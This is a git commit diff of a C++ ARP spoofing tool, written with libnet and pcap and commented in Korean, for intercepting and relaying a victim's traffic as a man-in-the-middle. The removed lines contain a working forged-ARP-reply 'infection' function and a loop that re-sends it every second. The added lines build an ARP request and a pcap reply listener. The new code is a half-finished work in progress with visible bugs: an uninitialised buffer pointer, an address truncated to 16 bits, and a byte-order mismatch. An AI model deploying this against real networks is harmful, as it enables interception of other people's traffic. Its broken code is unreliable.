65cfac9864f290efef59cc66b5e77a2216f1f2c5
백종열 <geeksbaek@gmail.com>
2016-05-03 13:47:56 +0900

    temp commit

--- arp_spoofing/main.cpp
+++ arp_spoofing/main.cpp
@@ -1,182 +1,119 @@
+/*
+    실행 : arpspoof <sender ip> <receiver ip>
+    설명 : attacker는 sender를 감염(infection)시키고,
+           sender와 receiver로 가는 ip packet을 relay시켜 준다.
+*/
+
 #include <stdio.h>
 #include <libnet.h>
+#include <pcap.h>
+#include <arpa/inet.h>
+#include <netinet/ether.h>
 #include <thread>
 
-void send_arp_packet();
-void send_arp_reply_infection_packet(bool printLog);
-void send_arp_reply_infection_packet_loop();
-void relay_ip_packet();
-void recover_victim_arp_table();
-void relay_modified_ip_packet();
+struct _libnet_arp_hdr {
+    u_short ar_hrd;                         /* format of hardware address */
+#define ARPHRD_ETHER     1                  /* ethernet hardware format */
+    u_short ar_pro;                         /* format of protocol address */
+    u_char  ar_hln;                         /* length of hardware address */
+    u_char  ar_pln;                         /* length of protocol addres */
+    u_short ar_op;                          /* operation type */
+#define ARPOP_REQUEST    1                  /* req to resolve address */
+#define ARPOP_REPLY      2                  /* resp to previous request */
+#define ARPOP_REVREQUEST 3                  /* req protocol address given hardware */
+#define ARPOP_REVREPLY   4                  /* resp giving protocol address */
+#define ARPOP_INVREQUEST 8                  /* req to identify peer */
+#define ARPOP_INVREPLY   9                  /* resp identifying peer */
 
-const char *dev         = "wlan0";
+    /*
+    *  These should implementation defined but I've hardcoded eth/IP.
+    */
+    u_char ar_sha[6];                         /* sender hardware address */
+    u_char ar_spa[4];                         /* sender protocol address */
+    u_char ar_tha[6];                         /* target hardware address */
+    u_char ar_tpa[4];                         /* target protocol address */
+};
 
-const char *gateway_ip  = "192.168.0.1";
-const char *gateway_mac = "90:9f:33:b3:53:c6";
+bool checkArgValidation(int argc, char *argv[]);
+bool sendARPRequest(char *targetIP, sockaddr_in *targetAddress);
+void recvARPResponse(char *targetIP, u_int16_t targetIPInt, char *recvMAC);
+void sendARPInfection(char *targetIP);
+void relaySpoofedPacket();
 
-const char *victim_ip   = "192.168.0.2";
-const char *victim_mac  = "64:bc:0c:68:e5:71";
+void _pcap_loop_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void _packet_redirect(const u_char *packet, u_int32_t len);
 
-const int attack_cycle  = 1; // seconds
+const char *dev = "eth0";
+const int ARRACK_CYCLE  = 1; // seconds
 
-int main() {
-    printf("Select the Function to be executed.\n\n");
-    printf("0. program exit.\n");
-    printf("1. send_arp_packet()\n");
-    printf("2. send_arp_reply_infection_packet()\n");
-    printf("3. send_arp_reply_infection_packet_loop()\n");
-    printf("4. relay_ip_packet()\n");
-    printf("5. recover_victim_arp_table()\n");
-    printf("6. relay_modified_ip_packet()\n");
+sockaddr_in SenderAddress;
+sockaddr_in ReceiverAddress;
 
-    int selected;
-
-     while(true) {
-        selected = 0;
-        printf("\n>> ");
-        scanf("%d", &selected);
-
-        switch(selected) {
-        case 0:
-            printf("Program Exit.\n");
-            exit(0);
-        case 1:
-            send_arp_packet();
-            break;
-        case 2:
-            send_arp_reply_infection_packet(true);
-            break;
-        case 3:
-            std::thread(send_arp_reply_infection_packet_loop).detach();
-            break;
-        case 4:
-            relay_ip_packet();
-            break;
-        case 5:
-            recover_victim_arp_table();
-            break;
-        case 6:
-            relay_modified_ip_packet();
-            break;
-        default:
-            printf("Invaild Input.\n");
-            break;
-        }
+int main(int argc, char *argv[]) {
+    if (checkArgValidation(argc, argv) == false) {
+        fprintf(stderr, "Invaild Arguments.\n");
+        exit(1);
     }
+
+    printf("%d\n", SenderAddress.sin_addr.s_addr);
+
+    char *senderIP = argv[1];
+    char *receiverIP = argv[2];
+
+    printf("sender IP Address : %s\n", senderIP);
+    printf("receiver IP Address : %s\n", receiverIP);
+
+    sendARPRequest(senderIP, &SenderAddress);
 
     return 0;
 }
 
-/*
-    1. ARP Request packet를 보내기.
-    버퍼를 할당하여(Ethernet Header 크기와 ARP Header 크기의 합만큼)
-    올바른 값을 집어 넣어(Gateway의 mac은 무엇이냐?)라고 물어 보는
-    ARP Request 패킷(frame)을 작성하여 패킷을 네트워크에 송신.
-    이 패킷에 대해서 Gateway가 ARP Reply를 하게 되면 성공.
-*/
-void send_arp_packet() {
-    int _t;
-    char *device = (char*) dev;                             /* network device */
-    in_addr_t destaddr = inet_addr(gateway_ip);             /* destination ip address */
-    u_int8_t *macaddr = libnet_hex_aton(gateway_mac, &_t);  /* destination mac address */
-    char errbuf[LIBNET_ERRBUF_SIZE];                        /* error messages */
-
-    /* open context */
-    libnet_t *l = libnet_init(LIBNET_LINK, device, errbuf);
-    if (l == NULL) {
-        fprintf(stderr, "Error opening context: %s", errbuf);
-        exit(1);
+bool checkArgValidation(int argc, char *argv[]) {
+    if (argc != 3 || inet_aton(argv[1], &SenderAddress.sin_addr) == 0
+            || inet_aton(argv[2], &ReceiverAddress.sin_addr) == 0) {
+        return false;
     }
-
-    /* get the hardware address, ip address for the card we are using */
-    u_int32_t ipaddr = libnet_get_ipaddr4(l);
-    libnet_ether_addr *hwaddr = libnet_get_hwaddr(l);
-
-    /* build the ARP header */
-    libnet_ptag_t arp = libnet_autobuild_arp(
-                ARPOP_REQUEST,          /* operation */
-                (u_int8_t*) hwaddr,     /* source hardware addr */
-                (u_int8_t*) &ipaddr,    /* source protocol addr */
-                macaddr,                /* target hardware addr */
-                (u_int8_t*) &destaddr,  /* target protocol addr */
-                l);                     /* libnet context */
-
-
-    if (arp == -1) {
-        fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
-        exit(1);
-    }
-
-    /* build the ethernet header */
-    libnet_ptag_t eth = libnet_build_ethernet(
-                macaddr,            /* destination address */
-                (u_int8_t*) hwaddr, /* source address */
-                ETHERTYPE_ARP,      /* type of encasulated packet */
-                NULL,               /* pointer to payload */
-                0,                  /* size of payload */
-                l,                  /* libnet context */
-                0);                 /* libnet protocol tag */
-
-    if (eth == -1) {
-        fprintf(stderr, "Unable to build Ethernet header: %s\n", libnet_geterror(l));
-        exit(1);
-    }
-
-    /* write the packet */
-    if (libnet_write(l) == -1) {
-        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
-        exit(1);
-    }
-
-    printf("ARP request packet was successfully sended.\n");
-
-    /* exit cleanly */
-    libnet_destroy(l);
+    return true;
 }
 
-/*
-    2. ARP Reply infection packet을 보내기.
-    Attacker, Victim, Gateway가 있을 때 Attacker는 자신이 Gateway인 것처럼
-    Victim을 속여서 Victim > Gateway로 가야 하는 IP Packet을 Attacker가
-    수신할 수 있도록 ARP Reply infection packet을 만들어 Attacker가 Victim에게 전송.
-    이후 Victim에서 ARP cache의 내용이 변경되면 성공.
-*/
-void send_arp_reply_infection_packet(bool printLog) {
+bool sendARPRequest(char *targetIP, sockaddr_in *targetAddress) {
     int _t;
     char *device = (char*) dev;
-    in_addr_t destaddr = inet_addr(victim_ip);
-    u_int8_t *macaddr = libnet_hex_aton(victim_mac, &_t);
+    in_addr_t dstIP = inet_addr(targetIP);
+    u_int8_t *dstMAC = libnet_hex_aton("ff:ff:ff:ff:ff:ff", &_t);
+    u_int8_t *dstHardware = libnet_hex_aton("00:00:00:00:00:00", &_t);
     char errbuf[LIBNET_ERRBUF_SIZE];
 
     /* open context */
     libnet_t *l = libnet_init(LIBNET_LINK, device, errbuf);
     if (l == NULL) {
         fprintf(stderr, "Error opening context: %s", errbuf);
-        exit(1);
+        return false;
     }
 
-    /* get the hardware address, ip address of gateway */
-    in_addr_t ipaddr = inet_addr(gateway_ip);
-    u_int8_t *hwaddr = libnet_hex_aton(gateway_mac, &_t);
+    /* get the hardware address, ip address for the card we are using */
+    u_int32_t srcIP = libnet_get_ipaddr4(l);
+    libnet_ether_addr *srcMAC = libnet_get_hwaddr(l);
 
     /* build the ARP header */
     libnet_ptag_t arp = libnet_autobuild_arp(
-                ARPOP_REPLY,            /* operation */
-                hwaddr,                 /* source hardware addr */
-                (u_int8_t*) &ipaddr,    /* source protocol addr */
-                macaddr,                /* target hardware addr */
-                (u_int8_t*) &destaddr,  /* target protocol addr */
-                l);                     /* libnet context */
+                ARPOP_REQUEST,      /* operation */
+                (u_int8_t*) srcMAC, /* source hardware addr */
+                (u_int8_t*) &srcIP, /* source protocol addr */
+                dstHardware,        /* target hardware addr */
+                (u_int8_t*) &dstIP, /* target protocol addr */
+                l);                 /* libnet context */
+
 
     if (arp == -1) {
         fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
-        exit(1);
+        return false;
     }
 
     /* build the ethernet header */
     libnet_ptag_t eth = libnet_build_ethernet(
-                macaddr,            /* destination address */
-                hwaddr,             /* source address */
+                dstMAC,             /* destination address */
+                (u_int8_t*) srcMAC, /* source address */
                 ETHERTYPE_ARP,      /* type of encasulated packet */
                 NULL,               /* pointer to payload */
                 0,                  /* size of payload */
@@ -185,55 +122,53 @@ void send_arp_reply_infection_packet(bool printLog) {
 
     if (eth == -1) {
         fprintf(stderr, "Unable to build Ethernet header: %s\n", libnet_geterror(l));
-        exit(1);
+        return false;
     }
 
     /* write the packet */
     if (libnet_write(l) == -1) {
         fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
-        exit(1);
+        return false;
     }
 
-    if (printLog) {
-        printf("ARP response packet was successfully sended.\n");
-    }
+    printf("ARP request packet was successfully sended.\n");
+
+    char *recvMAC;
+    recvARPResponse(targetIP, (u_int16_t) targetAddress->sin_addr.s_addr, recvMAC);
+
+    printf("received MAC Address : %s\n", recvMAC);
 
     /* exit cleanly */
     libnet_destroy(l);
+    return true;
 }
 
-/*
-    3. 주기적으로 ARP Reply infection packet을 전송.
-    Victim의 ARP Cache가 감염(infection)된 상태에서 언젠가 복원(recover)이 되는 경우가 있음.
-    이를 위해 주기적으로 ARP infection packet을 Victim에게 전달.
-*/
-void send_arp_reply_infection_packet_loop() {
-    while(true) {
-        send_arp_reply_infection_packet(false);
-        sleep(attack_cycle);
+void recvARPResponse(char *targetIP, u_int16_t targetIPInt, char *recvMAC) {
+    pcap_t *handle;                 /* Session handle */
+    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
+
+    /* Open the session in promiscuous mode */
+    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (handle == NULL) {
+        sprintf(recvMAC, "Couldn't open device %s: %s\n", dev, errbuf);
+        return;
     }
-}
 
-/*
-    4. IP packet relay시켜 주기.
-    Victim > Attacker로 전송된 IP Packet을 Attacker가 수신하였을 경우
-    이를 원래 가야 할 곳(Gateway)로 Relay시켜 주기.
-*/
-void relay_ip_packet() {
+    pcap_pkthdr header;
+    const u_char *packet;
 
-}
+    while (true) {
+        packet = pcap_next(handle, &header);
 
-/*
-    5. 공격이 끝나면 Victim의 ARP cache를 원래 상태로 복원시켜 주기.
-*/
-void recover_victim_arp_table() {
-
-}
-
-/*
-    6. IP packet을 relay시키기 이전에 Data나 IP, Port 등을 바꾸어 보기.
-    IP, TCP, UDP의 checksum 계산 로직을 알고 있어야 함.
-*/
-void relay_modified_ip_packet() {
-
+        libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
+        if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP) {
+            _libnet_arp_hdr *arpHeader = (_libnet_arp_hdr*) (packet + sizeof(libnet_ethernet_hdr));
+            printf("%d vs %d\n", *(u_int16_t*) arpHeader->ar_spa, targetIPInt);
+            if (arpHeader->ar_op == ARPOP_REPLY && (*(u_int16_t*) arpHeader->ar_spa) == targetIPInt) {
+                pcap_close(handle);
+                ether_ntoa_r((ether_addr*)arpHeader->ar_sha, recvMAC);
+                return;
+            }
+        }
+    }
 }
